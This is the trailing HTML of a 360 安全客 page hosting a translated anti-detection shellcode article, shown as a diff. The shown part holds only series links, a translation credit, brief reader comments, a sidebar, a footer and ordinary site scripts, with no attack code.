&#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><strong>【技术分享】反侦测的艺术part1：介绍AV和检测的技术</strong></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><a href="http://bobao.360.cn/learning/detail/3407.html" target="_self" textvalue="【技术分享】反侦测的艺术part2：精心打造PE后门（含演示视频）" style="text-decoration: none;"><strong style="text-indent: 2em; font-family: sans-serif; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">【技术分享】反侦测的艺术part2：精心打造PE后门（含演示视频）</span></strong><strong style="text-indent: 2em; font-family: sans-serif; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></a></p><p><strong style="text-indent: 2em; font-family: sans-serif; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><br/></strong></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><strong style="text-indent: 2em; font-family: sans-serif; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="http://bobao.360.cn/learning/detail/3407.html" target="_self" style="text-indent: 2em; font-family: sans-serif; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"></a></span></strong><br/></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/" target="_blank">原文链接：https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】反侦测的艺术part3：shellcode炼金术 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3589" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/12x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="12297" user-name="_等一分钟" href="javascript:;">
+                _等一分钟            </a>
+                        <span class="comment-time">2017-03-10 00:21:07</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12297">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12297" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">@我的印象笔记 好文</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/12x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="12296" user-name="_等一分钟" href="javascript:;">
+                _等一分钟            </a>
+                        <span class="comment-time">2017-03-10 00:20:51</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12296">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12296" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">@我的印象笔记 好文</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/10x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="12220" user-name="浪子_世家" href="javascript:;">
+                浪子_世家            </a>
+                        <span class="comment-time">2017-03-09 18:20:45</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12220">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12220" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">//@熊猫正正_IT: 转发微博</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3589" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
